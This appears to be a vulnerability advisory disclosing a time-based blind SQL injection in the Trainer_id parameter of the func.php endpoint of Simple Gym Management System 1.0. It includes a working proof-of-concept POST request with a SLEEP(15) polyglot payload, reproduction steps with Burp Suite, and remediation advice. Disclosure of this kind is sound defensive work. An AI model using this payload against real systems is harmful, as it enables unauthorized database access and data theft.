Time-Based Blind SQL Injection in Trainer_id Parameter Simple Gym Management System in PHP
Product

Simple Gym Management System in PHP

Vendor

Code-Projects

Vendor URL

https://code-projects.org/simple-gym-management-system-in-php-with-source-code/

Affected Version

1.0

Vulnerability Type

SQL Injection (Time-Based Blind)

CWE

CWE-89 – Improper Neutralization of Special Elements used in an SQL Command

Severity

High

Description

A Time-Based Blind SQL Injection vulnerability exists in the Simple Gym Management System in PHP 1.0 due to improper input validation in the Trainer_id parameter processed by the func.php endpoint.

The application fails to properly sanitize user-supplied input before incorporating it into SQL queries. Because of this, attackers can inject malicious SQL statements into the Trainer_id parameter when submitting trainer registration data.

By using database delay functions such as SLEEP(), attackers can verify the presence of SQL injection even when no error messages are displayed. When a crafted payload is submitted, the database executes the injected SLEEP() command, causing a measurable delay in the server response.

This confirms that user input is directly used in SQL queries without proper filtering or parameterization.

Successful exploitation may allow attackers to enumerate the database structure, extract sensitive information, bypass authentication mechanisms, and manipulate application data.

Affected Endpoint
/gym/func.php
Vulnerable Parameter
Trainer_id
Proof of Concept

The vulnerability can be triggered by sending the following HTTP request:

POST //gym/func.php HTTP/1.1
Host: localhost
Content-Length: 191
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost//gym/trainer.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=d09ljmgtflh1l4dagc0opvshgr
Connection: keep-alive

Trainer_id=orwa(select(0)from(select(sleep(15)))v)%2f%2a'%2B(select(0)from(select(sleep(15)))v)%2B'%22%2B(select(0)from(select(sleep(15)))v)%2B%22%2a%2f&Name=1w&phone=11w1&tra_submit=Register
Steps to Reproduce

Install and run the Simple Gym Management System.

Navigate to the trainer registration functionality (trainer.php).

Intercept the request using a proxy tool such as Burp Suite.

Modify the Trainer_id parameter with a time-based SQL injection payload.

Forward the request to the server.

Observe the response time.

Result

The server response is delayed by approximately 15 seconds, indicating that the injected SQL statement containing the SLEEP(15) function was executed by the backend database.

This confirms the presence of a time-based blind SQL injection vulnerability.

Impact

An attacker exploiting this vulnerability could:

Extract sensitive database information

Enumerate database tables and columns

Retrieve administrator credentials

Modify or delete application data

Potentially gain administrative access to the system

In severe scenarios, attackers may fully compromise the application's database.

Remediation

To mitigate this vulnerability, developers should implement the following security practices:

Use Prepared Statements

Parameterized queries prevent SQL injection attacks.

Example:

$stmt = $pdo->prepare("INSERT INTO trainer (Trainer_id, Name, phone) VALUES (?, ?, ?)");
$stmt->execute([$trainer_id, $name, $phone]);
Input Validation

Validate and sanitize all user-supplied input before processing it.

Principle of Least Privilege

Ensure the database account used by the application has minimal privileges.

Web Application Firewall

Deploy a WAF to detect and block SQL injection attempts.

Vulnerability Classification

CWE:

CWE-89 – SQL Injection

OWASP Top 10:

A03:2021 – Injection

Reference

https://code-projects.org/simple-gym-management-system-in-php-with-source-code/

https://cwe.mitre.org/data/definitions/89.html

https://owasp.org/www-community/attacks/SQL_Injection

<img width="1360" height="577" alt="Image" src="https://github.com/user-attachments/assets/823d2480-2636-4871-a5a8-c546e97ce25d" />
